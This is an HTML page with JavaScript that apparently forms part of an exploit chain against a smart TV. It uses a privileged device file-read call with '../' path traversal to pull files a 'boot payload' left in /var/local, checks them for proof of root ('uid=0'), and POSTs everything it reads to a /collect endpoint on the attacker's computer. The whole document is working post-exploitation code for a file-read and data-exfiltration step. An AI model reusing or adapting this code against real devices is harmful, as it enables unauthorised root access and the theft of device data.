<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>alvidaa proof</title>
<style>
  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
         word-break: break-all; padding: 10px; }
  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
  .big { font-size: 26px; font-weight: bold; }
</style>
</head>
<body>
<div id="out"></div>
<script>
(function () {
  "use strict";
  // READ-ONLY. Collects whatever the boot payload left in /var/local/alvidaa
  // and POSTs it to /collect on the PC.
  var el = document.getElementById("out");
  var PATHS = [
    "../var/local/alvidaa/proof.txt",
    "../var/local/alvidaa/payload.log",
    "../var/local/alvidaa/recon.txt",
    "../var/local/alvidaa/PFMCheck.bak",
    "../var/local/alvidaa/platform.bak",
    "../var/local/pfmParse/PFMCheck",
    "../var/local/pfmParse/Data/platform.txt",
    "../var/local/DebugPowerup"
  ];
  var rep = { started: new Date().toISOString(), ua: navigator.userAgent, files: {} };

  function out(t, c) {
    var d = document.createElement("div");
    d.textContent = t;
    if (c) d.className = c;
    el.appendChild(d);
    window.scrollTo(0, document.body.scrollHeight);
  }
  function norm(m) {
    if (m == null) return "";
    if (typeof m === "string") return m;
    try { return JSON.stringify(m); } catch (e) { return String(m); }
  }
  function rd(p) {
    try {
      var r = HiUtils_createRequest("fileRead", { path: [p], mode: 6 });
      if (r && typeof r === "object") return { ret: r.ret, msg: norm(r.msg).slice(0, 120000) };
      return { ret: true, msg: norm(r).slice(0, 120000) };
    } catch (e) { return { ret: false, msg: "EXC " + e }; }
  }

  async function main() {
    out("alvidaa proof — " + new Date().toISOString(), "hdr");
    var proof = null;
    PATHS.forEach(function (p) {
      var r = rd(p);
      rep.files[p] = r;
      var txt = String(r.msg);
      if (r.ret === true && p.indexOf("proof.txt") !== -1) proof = txt;
      out((r.ret === true ? "[OK] " : "[--] ") + p + "  (" + txt.length + ")",
          r.ret === true ? "ok" : "warn");
      if (r.ret === true && (p.indexOf("proof.txt") !== -1 || p.indexOf("payload.log") !== -1)) {
        out("   " + txt.replace(/\s+/g, " ").slice(0, 400), "hdr");
      }
    });
    rep.proof = proof;
    out("");
    if (proof && proof.indexOf("uid=0") !== -1) {
      out("UID 0 INSIDE THE TV", "ok big");
    } else if (proof) {
      out("proof.txt есть, но uid не 0", "warn big");
    } else {
      out("proof.txt отсутствует — payload не выполнился", "err big");
    }
    var up = "?";
    try {
      var x = await fetch("/collect", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(rep)
      });
      up = "HTTP " + x.status;
    } catch (e) { up = "EXC " + e; }
    out("report " + up, "hdr");
  }
  main().catch(function (e) { rep.fatal = String(e); out("FATAL " + e, "err"); });
})();
</script>
</body>
</html>
